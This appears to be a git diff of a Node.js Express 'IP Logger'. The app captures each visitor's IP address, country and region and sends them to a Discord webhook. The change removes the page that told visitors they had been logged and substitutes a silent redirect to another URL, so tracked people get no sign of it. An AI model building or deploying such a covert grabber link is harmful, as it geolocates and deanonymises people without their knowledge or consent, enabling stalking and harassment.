@@ -4,11 +4,10 @@ const express = require("express");
 const app = express();
 
 const { sendWebhook } = require("./webhook");
-const { MessageBuilder } = require("discord-webhook-node"); // Add this line
+const { MessageBuilder } = require("discord-webhook-node");
 const channelID = process.env.channel_id;
 const ip_token = process.env.ip_token;
 const port = process.env.port || 3000;
-
 
 app.get("/", async (req, res) => {
   const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
@@ -23,7 +22,7 @@ app.get("/", async (req, res) => {
   try {
     const embed = new MessageBuilder()
       .setTitle("IP Logger")
-      .setDescription("New address logged.")
+      .setDescription("This is an IP logger made by https://github.com/baum1810")
       .addField("IP", ipAddress)
       .addField("Country", country)
       .addField("Region", region)
@@ -38,44 +37,11 @@ app.get("/", async (req, res) => {
       .setTimestamp();
     await sendWebhook(channelID, embed);
 
-    const htmlContent = `
-      <!DOCTYPE html>
-      <html lang="en">
-      <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Address Logged</title>
-        <style>
-          body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background: linear-gradient(45deg, #84fab0 0%, #8fd3f4 100%);
-            margin: 0;
-            font-family: Arial, sans-serif;
-          }
-          h1 {
-            font-size: 5rem;
-            animation: fadeIn 4s ease-in-out infinite;
-          }
-          @keyframes fadeIn {
-            0%, 100% { opacity: 0; }
-            50% { opacity: 1; }
-          }
-        </style>
-      </head>
-      <body>
-        <h1>Address Logged</h1>
-      </body>
-      </html>
-    `;
-
-    res.send(htmlContent);
-    } catch (error) {
-  console.error(`Error handling request:\n${error.stack}`);
-  res.status(500).send("Internal server error");
-}
+    res.redirect(process.env.redirect_url);
+  } catch (error) {
+    console.error(`Error handling request:\n${error.stack}`);
+    res.status(500).send("Internal server error");
+  }
 });
 
 app.listen(port, () => console.log(`App listening at http://localhost:${port}`));
